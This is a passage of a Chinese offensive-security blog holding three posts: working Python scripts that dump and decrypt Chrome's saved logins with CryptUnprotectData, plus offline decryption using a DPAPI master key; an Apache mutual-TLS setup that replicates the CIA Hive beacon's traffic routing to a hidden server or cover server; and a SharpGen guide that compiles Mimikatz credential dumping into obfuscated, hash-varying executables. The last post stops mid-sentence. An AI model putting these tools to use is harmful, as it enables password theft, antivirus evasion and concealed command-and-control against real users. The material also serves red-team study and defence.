<p>如果Chrome正在运行，无法使用SQLiteStudio打开数据库文件Login Data，可将该文件复制后再打开</p>

<h2 id="0x03-导出chrome浏览器中保存的密码">0x03 导出Chrome浏览器中保存的密码</h2>
<hr>

<p>首先，编写程序实现读取SQLite数据库文件，这里选择使用python实现</p>

<p>开源代码很多，所以这里只给出一个示例</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from os import getenv
import sqlite3
import binascii
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    print (binascii.b2a_hex(result[2]))
</code></pre></div></div>

<p>获得二次加密的用户密码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/3-1.png" alt="Alt text"></p>

<p>参考Chromium开源代码，找到Chrome做二次加密的方法： <strong>通过Windows API CryptProtectData()实现</strong></p>

<p>参考加密代码：</p>

<p>https://github.com/scheib/chromium/blob/eb7e2441dd8878f733e43799ea77c2bab66816d3/chrome/browser/password_manager/password_store_win_unittest.cc#L107</p>

<p>CryptProtectData()的说明可参考：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa380261(v=vs.85).aspx</p>

<p>获得关键信息：</p>

<h4 id="1对应解密函数为cryptunprotectdata">(1)对应解密函数为CryptUnprotectData</h4>

<p>参考地址：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa380882(v=vs.85).aspx</p>

<h4 id="2只有与加密数据的用户具有相同登录凭据的用户才能解密数据">(2)只有与加密数据的用户具有相同登录凭据的用户才能解密数据</h4>

<p>也就是说，只能在当前用户的凭据下解密数据</p>

<p>解密的开源代码也有很多，这里给出一个示例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from os import getenv
import sqlite3
import win32crypt
import binascii
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
    print password
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>调用win32crypt.CryptUnprotectData需要安装pywin32</p>

<p>下载地址：</p>

<p>http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/pywin32-219.win32-py2.7.exe</p>

<p>执行后，还原用户密码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/3-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>如果Chrome正在运行，无法查询数据库文件Login Data，显示<code class="language-plaintext highlighter-rouge">sqlite3.OperationalError: database is locked</code></p>

<p>综上，在实际导出的过程中，如果Chrome正在运行，需要先复制数据库文件，再尝试解密</p>

<h2 id="0x04-如何导出另一系统下chrome浏览器中保存的密码">0x04 如何导出另一系统下Chrome浏览器中保存的密码</h2>
<hr>

<p>参照CryptProtectData()的说明，地址如下：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa380261(v=vs.85).aspx</p>

<blockquote>
  <p>“Usually, the only user who can decrypt the data is a user with the
same logon credentials as the user who encrypted the data.In addition,
the encryption and decryption must be done on the same computer. “</p>
</blockquote>

<p>是否可以断定，无法在另一系统下导出Chrome浏览器中保存的密码呢？</p>

<p>答案是否定的</p>

<p>Chrome密码还原工具chromepass提供了一个特别的功能： <code class="language-plaintext highlighter-rouge">Reading ChromePass passwords from external drive</code></p>

<p>chromepass下载地址：</p>

<p>http://www.nirsoft.net/utils/chromepass.html</p>

<p>说明如下：</p>

<blockquote>
  <p>“you can also read the passwords stored by Chrome Web browser from an
external profile in your current operating system or from another
external drive”</p>
</blockquote>

<p>也就是说，使用chromepass能够导出当前系统下另一用户的Chrome密码</p>

<p>操作界面如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/4-1.png" alt="Alt text"></p>

<p>既然如此，如果获得了另一系统下的相关配置文件，能否导出Chrome浏览器中保存的密码呢？</p>

<p>当然可以</p>

<p>解密需要获得三部分内容：</p>

<ol>
  <li>加密密钥(即Master Key文件)，位于<code class="language-plaintext highlighter-rouge">%appdata%\Microsoft\Protect</code>下对应sid文件夹下的文件</li>
  <li>数据库文件Login Data</li>
  <li>用户明文的密码，用于解密加密密钥</li>
</ol>

<p>由于chromepass程序的设计问题，以上文件需要组成特定格式，子目录格式如下：</p>

<ul>
  <li>
    <p>\AppData\Local\Google\Chrome\User Data\Default\Login Data</p>
  </li>
  <li>
    <p>\AppData\Roaming\Microsoft\Protect{sid}}\下保存key文件</p>
  </li>
</ul>

<p><strong>注：</strong></p>

<p>{sid}必须同原系统的对应</p>

<p>eg.</p>

<p><code class="language-plaintext highlighter-rouge">\AppData\Local\Google\Chrome\User Data\Default\Login Data</code></p>

<p><code class="language-plaintext highlighter-rouge">\AppData\Roaming\Microsoft\Protect\S-1-5-21-3453529135-4164765056-1075703908-1001\329c4147-0011-4ad6-829d-e32dcbd1bbd7</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/4-2.png" alt="Alt text"></p>

<p>使用chromepass选择该目录，填入用户明文密码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/4-3.png" alt="Alt text"></p>

<p>成功解密，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/4-4.png" alt="Alt text"></p>

<p><strong>补充：</strong></p>

<p>chromepass也可在命令行下使用</p>

<h2 id="0x05-开源工具">0x05 开源工具</h2>
<hr>

<p>解密当前系统下Chrome浏览器中保存的密码，可供参考的工具：</p>

<ol>
  <li>命令行工具Chrome Password Dump，下载地址：</li>
</ol>

<p>http://securityxploded.com/chrome-password-dump.php</p>

<ol>
  <li>powershell实现的工具：</li>
</ol>

<p>https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ChromeDump.ps1</p>

<ol>
  <li>python实现代码，可供参考的开源代码：</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from os import getenv
import sqlite3
import win32crypt
import binascii
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
    if password:
        print 'Site: ' + result[0]
        print 'Username: ' + result[1]
        print 'Password: ' + password
    else:
        print "no password found"
</code></pre></div></div>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了导出Chrome浏览器密码的原理和利用方法，成功解决一个实际问题： <code class="language-plaintext highlighter-rouge">通过加密密钥文件和用户明文密码，能够导出另一系统下Chrome浏览器中保存的密码</code></p>

<p>如果只获得了用户密码ntlm hash，能否导出呢？</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January 25, 2018
  </div>

  
</article><article class="post">
  <h1>CIA Hive Beacon Infrastructure复现2——使用Apache mod_rewrite实现https流量分发</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>上篇文章介绍了使用Apache的mod_rewrite模块来实现http流量分发，本文将在此基础上介绍https的流量分发，对客户端的证书进行判断，若证书有效，才会将流量转发至真实服务器。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Windows系统下配置Apache开启ssl</li>
  <li>Ubuntu系统下配置Apache开启ssl</li>
  <li>使用openssl生成证书的方法和难点</li>
  <li>Apache Https双向认证的配置</li>
  <li>实现https流量分发的过程</li>
</ul>

<h2 id="0x02-windows系统下配置apache开启ssl">0x02 Windows系统下配置Apache开启ssl</h2>
<hr>

<h3 id="1下载包含openssl的apache">1、下载包含openssl的Apache</h3>

<p>地址：</p>

<p>http://httpd.apache.org/download.cgi</p>

<p>选择需要的版本，测试版本Apache 2.4.33，下载地址：</p>

<p>https://www.apachehaus.com/cgi-bin/download.plx?dli=wUWZ1allWW00kej9iUG5UeJVlUGRVYRdnWzQmW</p>

<h3 id="2安装">2、安装</h3>

<p>解压后通过命令行安装：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd \Apace24\bin
httpd -k install
</code></pre></div></div>

<h3 id="3配置httpdconf">3、配置httpd.conf</h3>

<p>位于<code class="language-plaintext highlighter-rouge">\Apace24\conf\httpd.conf</code></p>

<h4 id="1">(1)</h4>

<p>定位：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#LoadModule ssl_module modules/mod_ssl.so 
</code></pre></div></div>

<p>去掉#</p>

<h4 id="2">(2)</h4>

<p>定位：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;IfModule ssl_module&gt;
Include conf/extra/httpd-ahssl.conf
SSLRandomSeed startup builtin
SSLRandomSeed connect builtin
&lt;/IfModule&gt;
</code></pre></div></div>

<p>将<code class="language-plaintext highlighter-rouge">Include conf/extra/httpd-ahssl.conf</code>改为<code class="language-plaintext highlighter-rouge">Include conf/extra/httpd-ssl.conf</code></p>

<p><strong>注：</strong></p>

<p>httpd-ahssl.conf是Apache自带的ssl配置，默认生成了可用的私钥和证书(位于<code class="language-plaintext highlighter-rouge">\Apace24\conf\ssl</code>)，也可以直接修改httpd-ahssl.conf进行配置</p>

<h3 id="4配置httpd-sslconf">4、配置httpd-ssl.conf</h3>

<p>位于<code class="language-plaintext highlighter-rouge">\Apache24\conf\extra\httpd-ssl.conf</code></p>

<h4 id="1-1">(1)</h4>

<p>定位：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;VirtualHost _default_:443&gt;

#   General setup for the virtual host
DocumentRoot "${SRVROOT}/htdocs"
ServerName www.example.com:443
</code></pre></div></div>

<p>修改为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;VirtualHost _default_:443&gt;

#   General setup for the virtual host
DocumentRoot "${SRVROOT}/htdocs"
ServerName test.com:443
</code></pre></div></div>

<h4 id="2-1">(2)</h4>

<p>定位：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SSLCertificateFile "${SRVROOT}/conf/server.crt"
</code></pre></div></div>

<p>修改为自己证书文件的路径(后面会介绍生成方法)</p>

<h4 id="3">(3)</h4>

<p>定位：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SSLCertificateKeyFile "${SRVROOT}/conf/server.key"
</code></pre></div></div>

<p>修改为自己私钥文件的路径(后面会介绍生成方法)</p>

<h3 id="5重启apache">5、重启apache</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>httpd.exe -k restart
</code></pre></div></div>

<h2 id="0x03-ubuntu系统下配置apache开启ssl">0x03 Ubuntu系统下配置Apache开启ssl</h2>
<hr>

<h3 id="1安装apache">1、安装apache</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt-get install apache2
</code></pre></div></div>

<h3 id="2安装openssl">2、安装openssl</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt-get install openssl
</code></pre></div></div>

<h3 id="3开启apache-ssl模块">3、开启Apache SSL模块</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a2enmod ssl
</code></pre></div></div>

<h3 id="4编辑文件etcapache2sites-enableddefault-sslconf">4、编辑文件<code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/default-ssl.conf</code></h3>

<p>指定私钥文件和签名证书的路径</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SSLEngine on
SSLCertificateFile /etc/apache2/ssl/test.com.crt
SSLCertificateKeyFile /etc/apache2/ssl/test.com.key
</code></pre></div></div>

<h3 id="5启用apache默认的ssl虚拟主机">5、启用Apache默认的SSL虚拟主机</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a2ensite default-ssl
</code></pre></div></div>

<h3 id="6重启apache">6、重启Apache:</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /etc/init.d/apache2 restart
</code></pre></div></div>

<h2 id="0x04-生成ssl证书的流程">0x04 生成SSL证书的流程</h2>
<hr>

<h3 id="1客户端生成一对公钥和私钥key文件">1、客户端生成一对公钥和私钥(.key文件)</h3>

<h3 id="2客户端生成证书请求文件csr文件">2、客户端生成证书请求文件(.csr文件)</h3>

<p>将csr文件发送给CA机构进行校验，若审核通过，CA机构使用自己的私钥对csr文件进行签名，生成证书文件(.crt文件),发给用户，用户使用该证书证明自己的身份</p>

<p>生成方法：</p>

<p>输入：</p>

<ul>
  <li>用户私钥</li>
  <li>用户信息</li>
</ul>

<p>输出：</p>

<p>csr文件，包括用户公钥和用户信息</p>

<h3 id="3ca审核请求生成证书文件crt">3、CA审核请求，生成证书文件(.crt)</h3>

<p>一般是将csr文件发送到证书签发机构CA进行校验，但是我们可以自己对其审核，生成一个自签名证书(可用于测试，无法保证可信)</p>

<h2 id="0x05-使用openssl生成ssl证书">0x05 使用openssl生成SSL证书</h2>
<hr>

<p>Ubuntu安装openssl后可直接运行openssl</p>

<p>Windows安装Apache后默认安装openssl，位于<code class="language-plaintext highlighter-rouge">\Apache24\bin</code></p>

<h3 id="1常规方法">1、常规方法：</h3>

<h4 id="1-生成2048位的加密私钥">(1) 生成2048位的加密私钥</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl genrsa -out server.key 2048
</code></pre></div></div>

<h4 id="2-生成证书签名请求">(2) 生成证书签名请求</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req -new -key server.key -out server.csr
</code></pre></div></div>

<p>接着依次填入配置信息，<code class="language-plaintext highlighter-rouge">Common Name</code>项要同域名对应(测试域名为test.com)</p>

<h4 id="3-生成自签名证书">(3) 生成自签名证书</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl x509 -req -days 3650 -in server.csr -signkey server.key -out server.crt
</code></pre></div></div>

<h3 id="2快捷方法">2、快捷方法：</h3>

<p>通过网站自动生成openssl配置参数，地址如下：</p>

<p>https://myssl.com/csr_create.html</p>

<p>填入配置信息后自动生成openssl参数，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-18/2-1.png" alt="Alt text"></p>

<p>参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req -new -SHA256 -newkey rsa:2048 -nodes -keyout test.com.key -out test.com.csr -subj "/C=CN/ST=Shanghai/L=Shanghai/O=11/OU=22/CN=test.com"
</code></pre></div></div>

<p>生成私钥文件test.com.key和证书签名请求test.com.csr</p>

<p>接着生成自签名证书：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl x509 -req -days 3650 -in test.com.csr -signkey test.com.key -out test.com.crt
</code></pre></div></div>

<p><strong>实际测试：</strong></p>

<h4 id="1-修改apache服务器的ssl配置">(1) 修改apache服务器的ssl配置</h4>

<p>SSLCertificateFile指向自签名证书(.crt文件)路径</p>

<p>SSLCertificateKeyFile指向私钥文件(.key文件)路径</p>

<p>重启apache服务</p>

<h4 id="2-客户端修改hosts文件">(2) 客户端修改hosts文件：</h4>

<p>apache服务器ip对应test.com</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-18/2-2.png" alt="Alt text"></p>

<h4 id="3-客户端将自签名证书安装到受信任的根证书颁发机构">(3) 客户端将自签名证书安装到<code class="language-plaintext highlighter-rouge">受信任的根证书颁发机构</code></h4>

<p>安装后如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-18/2-3.png" alt="Alt text"></p>

<h4 id="4-客户端访问apache服务器">(4) 客户端访问Apache服务器</h4>

<p>访问失败，提示<code class="language-plaintext highlighter-rouge">它的安全证书没有指定主题备用名称</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-18/2-4.png" alt="Alt text"></p>

<p>常规方法和快捷方法生成的证书均存在这个问题</p>

<h3 id="3解决方法">3、解决方法</h3>

<p>证书缺少主题备用名称SAN (Subject Alternate Name)，需要通过配置文件进行添加</p>

<p>参考资料：</p>

<p>https://support.citrix.com/article/CTX135602_</p>

<p>新建文件req.cnf，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no
[req_distinguished_name]
C = US
ST = VA
L = SomeCity
O = MyCompany
OU = MyDivision
CN = test.com
[v3_req]
keyUsage = critical, digitalSignature, keyAgreement
extendedKeyUsage = serverAuth
subjectAltName = @alt_names
[alt_names]
DNS.1 = test.com
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>CN和DNS.1都需要设定为域名(测试域名为test.com)</p>

<p>生成私钥和自签名证书：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout test.com.key -out test.com.crt -config req.cnf -sha256
</code></pre></div></div>

<p>修改apache服务器的ssl配置,指定新的私钥文件(test.com.key)和证书文件(test.com.crt)，重启apache服务</p>

<p>客户端安装自签名证书文件test.com.crt</p>

<p>访问Apache服务器，证书有效，一切正常，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-18/2-5.png" alt="Alt text"></p>

<p><strong>补充：</strong></p>

<p>在未来，openssl有可能支持设置参数<code class="language-plaintext highlighter-rouge">DNS.1</code>，相关资料：</p>

<p>https://github.com/openssl/openssl/pull/4986</p>

<h2 id="0x06-规则配置实现https流量分发">0x06 规则配置实现https流量分发</h2>
<hr>

<h3 id="1开启双向认证">1、开启双向认证</h3>

<p>服务器验证客户端证书，如果客户端证书有效，客户端才能正常访问网页，否则无法访问</p>

<h4 id="1-windows系统">(1) Windows系统</h4>

<p><strong>1.生成客户端证书</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req -new -SHA256 -newkey rsa:2048 -nodes -keyout user.key -out user.csr -subj "/C=CN/ST=Shanghai/L=Shanghai/O=11/OU=22/CN=user"
openssl x509 -req -days 365 -in user.csr -signkey user.key -out user.crt
openssl pkcs12 -export -cacerts -inkey user.key -in user.crt -out user.p12
</code></pre></div></div>

<p><strong>2.服务器编辑文件<code class="language-plaintext highlighter-rouge">\Apache24\conf\extra\httpd-ssl.conf</code></strong></p>

<p>添加客户端证书的路径，指向user.crt</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SSLEngine on
SSLCertificateFile "${SRVROOT}/conf/test.com.crt"
SSLCertificateKeyFile "${SRVROOT}/conf/test.com.key"
SSLCACertificateFile "${SRVROOT}/conf/user.crt"
</code></pre></div></div>

<p>开启客户端认证：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SSLVerifyClient require  
SSLVerifyDepth  10 
</code></pre></div></div>

<p><strong>3.重启Apache</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>httpd.exe -k restart
</code></pre></div></div>

<p><strong>4.客户端安装证书user.p12</strong></p>

<p>访问网页时弹框提示，确认证书后正常访问，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-18/3-1.png" alt="Alt text"></p>

<h4 id="2-ubuntu系统">(2) Ubuntu系统</h4>

<p><strong>1.生成客户端证书</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req -new -SHA256 -newkey rsa:2048 -nodes -keyout user.key -out user.csr -subj "/C=CN/ST=Shanghai/L=Shanghai/O=11/OU=22/CN=user"
openssl x509 -req -days 365 -in user.csr -signkey user.key -out user.crt
openssl pkcs12 -export -cacerts -inkey user.key -in user.crt -out user.p12
</code></pre></div></div>

<p><strong>2.服务器编辑文件<code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/default-ssl.conf</code></strong></p>

<p>指定私钥文件、签名证书和客户端证书的路径</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SSLEngine on
SSLCertificateFile /etc/apache2/ssl/test.com.crt
SSLCertificateKeyFile /etc/apache2/ssl/test.com.key
SSLCACertificateKeyFile /etc/apache2/ssl/user.crt
</code></pre></div></div>

<p>开启客户端认证：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SSLVerifyClient require  
SSLVerifyDepth  10 
</code></pre></div></div>

<p><strong>3.重启Apache</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /etc/init.d/apache2 restart
</code></pre></div></div>

<p><strong>4.客户端安装证书user.p12</strong></p>

<p>正常访问</p>

<h3 id="2流量转发">2、流量转发</h3>

<p>配置方法参照上篇文章，本文不再赘述</p>

<p>最终能实现对Https的流量进行判断，如果证书有效，转发到真实服务器</p>

<p>如果证书无效，可选择转发到Cover Server或是不提供服务</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了Windows系统和Ubuntu系统下配置Apache https的方法，分享SSL证书生成方法和配置过程，在技术研究的角度实现了对Https的流量判断，根据条件进行https流量的分发。</p>

<p>至此，成功实现Hive的流量分发功能。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on April 18, 2018
  </div>

  
</article><article class="post">
  <h1>SharpGen利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>SharpGen是我认为特别棒的一个工具，它能够用来对其他.Net程序集进行整合、重组并加密，二次编译后可生成一个全新的工具</p>

<p>本文将要研究SharpGen的细节，介绍调用其他开源库的详细方法，分析利用思路</p>

<p>参考链接：</p>

<p>https://github.com/cobbr/SharpGen</p>

<p>https://cobbr.io/SharpGen.html</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>.NET Core开发环境搭建</li>
  <li>功能介绍</li>
  <li>调用其他开源库的方法</li>
  <li>利用思路</li>
</ul>

<h2 id="0x02-net-core开发环境搭建">0x02 .NET Core开发环境搭建</h2>
<hr>

<p>SharpGen使用.NET Core，优点是支持多平台(Linux，MacOS和Windows)</p>

<p>编程语言使用C#，利用<a href="https://github.com/dotnet/roslyn">Rosyln</a>编译.NET Framework控制台应用程序或库</p>

<p><strong>注：</strong></p>

<p>Rosyln是一个.NET编译器平台，通过Scripting API，能够对脚本文件进行动态编译</p>

<p>测试系统：Win7x64</p>

<p>我在测试系统选择安装.NET Core 2.2.0、ASP.NET Core 2.2.0和SDK 2.2.101，这是为了兼容另一个工具<a href="https://github.com/cobbr/Covenant">Covenant</a></p>

<p>对应版本的下载链接如下：</p>

<p>https://dotnet.microsoft.com/download/thank-you/dotnet-sdk-2.2.101-windows-x64-installer</p>

<p>https://dotnet.microsoft.com/download/thank-you/dotnet-runtime-2.2.0-windows-x64-installer</p>

<p>https://dotnet.microsoft.com/download/thank-you/dotnet-runtime-2.2.0-windows-x64-asp.net-core-runtime-installer</p>

<p>安装Git for Windows，下载链接如下：</p>

<p>https://github.com/git-for-windows/git/releases/download/v2.23.0.windows.1/Git-2.23.0-64-bit.exe</p>

<p>下载安装并编译SharpGen：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/cobbr/SharpGen
cd SharpGen
dotnet build --configuration Release
</code></pre></div></div>

<h2 id="0x03-基本功能介绍">0x03 基本功能介绍</h2>
<hr>

<p>SharpGen默认集成了<a href="https://github.com/cobbr/SharpSploit">SharpSploit</a>，能够直接调用其中的功能</p>

<p>参数说明：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Options:
  -? | -h | --help                                     Show help information
  -f | --file &lt;OUTPUT_FILE&gt;                            The output file to write to.
  -d | --dotnet | --dotnet-framework &lt;DOTNET_VERSION&gt;  The Dotnet Framework version to target (net35 or net40).
  -o | --output-kind &lt;OUTPUT_KIND&gt;                     The OutputKind to use (console or dll).
  -p | --platform &lt;PLATFORM&gt;                           The Platform to use (AnyCpy, x86, or x64).
  -n | --no-optimization                               Don't use source code optimization.
  -a | --assembly-name &lt;ASSEMBLY_NAME&gt;                 The name of the assembly to be generated.
  -s | --source-file &lt;SOURCE_FILE&gt;                     The source code to compile.
  -c | --class-name &lt;CLASS_NAME&gt;                       The name of the class to be generated.
  --confuse &lt;CONFUSEREX_PROJECT_FILE&gt;                  The ConfuserEx ProjectFile configuration.
</code></pre></div></div>

<h3 id="1对单行代码进行编译">1.对单行代码进行编译</h3>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe "Console.WriteLine(Mimikatz.LogonPasswords());"
</code></pre></div></div>

<p>执行过程显示自动补齐的编译代码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-17/2-1.png" alt="Alt text"></p>

<p>值得注意的是其中的随机类名<code class="language-plaintext highlighter-rouge">ohq8r7eQ1qK</code>，每次生成文件时使用的类名均会改变</p>

<p><strong>注：</strong></p>

<p>如果想指定类名，可以加入<strong>-c</strong>参数，示例如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dotnet bin/Release/netcoreapp2.1/SharpGen.dll -c abcde12345 -f example.exe "Console.WriteLine(Mimikatz.LogonPasswords());" 
</code></pre></div></div>

<p>命令执行后生成example.exe，example.exe会调用Mimikatz的<code class="language-plaintext highlighter-rouge">sekurlsa::logonpasswords</code>命令</p>

<h3 id="2对完整代码文件进行编译">2.对完整代码文件进行编译</h3>

<p>example.txt的内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using SharpSploit.Execution;
using SharpSploit.Credentials;

class Program
{
    static void Main()
    {
        Console.WriteLine(Mimikatz.LogonPasswords());
        return;
    }
}
</code></pre></div></div>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe --source-file example.txt
</code></pre></div></div>

<p>执行过程显示编译代码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-10-17/2-2.png" alt="Alt text"></p>

<p>由于指定了类名为<code class="language-plaintext highlighter-rouge">Program</code>，所以不再具有随机类名的功能</p>

<p><strong>注：</strong></p>

<p>SharpGen使用了Rosyln进行动态编译，每次生成的文件hash都会不一样</p>

<h2 id="0x04-高级功能">0x04 高级功能</h2>
<hr>

<h3 id="1缩小生成文件的体积">1.缩小生成文件的体积</h3>

<h4 id="1取消对指定dll的引用">(1)取消对指定dll的引用</h4>

<p>编辑文件<code class="language-plaintext highlighter-rouge">SharpGen/References/references.yml</code></p>

<p>此处的dll通常为C#程序使用的引用文件</p>

<p>不需要的dll名称属性由<code class="language-plaintext highlighter-rouge">Enabled: true</code>改为<code class="language-plaintext highlighter-rouge">Enabled: false</code></p>

<h4 id="2取消对指定dll的引用">(2)取消对指定dll的引用</h4>

<p>编辑文件<code class="language-plaintext highlighter-rouge">SharpGen/Resources/resources.yml</code></p>

<p>此处的dll为实现mimikatz的功能</p>

<p>不需要的dll名称属性由<code class="language-plaintext highlighter-rouge">Enabled: true</code>改为<code class="language-plaintext highlighter-rouge">Enabled: false</code></p>

<p><strong>注：</strong></p>

<ul>
  <li>powerkatz_x64.dll为64位的mimikatz</li>
  <li>powerkatz_x64.dll.comp为使用System.IO.Compression库压缩后的64位的mimikatz</li>
  <li>powerkatz_x86.dll为32位的mimikatz</li>
  <li>powerkatz_x86.dll.comp为使用System.IO.Compression库压缩后的32位的mimikatz</li>
</ul>

<h4 id="3使用confuserex资源保护">(3)使用ConfuserEx资源保护</h4>

<p>ConfuserEx资源保护会对资源进行加密和LZMA压缩</p>

<p>示例命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe --confuse confuse.cr "Console.WriteLine(Mimikatz.LogonPasswords());"
</code></pre></div></div>

<h3 id="2调用其他开源库">2.调用其他开源库</h3>

<p>参考资料中未介绍这部分内容，这里给出我的解决方法</p>

<p>这里给出两个示例，一个是开源的<a href="https://github.com/GhostPack/SharpWMI">SharpWMI</a>，另一个是我自己编写的模板SharpTest</p>

<h4 id="1添加对sharpwmi的调用">1.添加对SharpWMI的调用</h4>

<p>(1)将SharpWMI源码复制到<code class="language-plaintext highlighter-rouge">SharpGen/Source</code></p>

<p>(2)修改<code class="language-plaintext highlighter-rouge">SharpGen/SharpGen.csproj</code></p>

<p>ItemGroup标签中添加<code class="language-plaintext highlighter-rouge">&lt;Compile Remove="Source\SharpWMI\Program.cs" /&gt;</code></p>

<p>否则在编译SharpGen时会报错提示：</p>

